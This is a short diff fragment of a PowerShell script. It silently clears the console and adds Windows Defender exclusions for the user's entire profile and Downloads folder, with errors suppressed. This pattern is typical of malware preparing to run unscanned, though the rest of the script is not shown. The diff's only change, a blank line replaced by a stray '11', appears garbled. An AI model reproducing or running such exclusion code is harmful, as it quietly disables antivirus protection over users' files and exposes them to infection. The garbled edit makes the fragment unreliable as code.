@@ -1,6 +1,6 @@
 $ProgressPreference = 'SilentlyContinue'
 Clear-Host
-
+11
 try {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
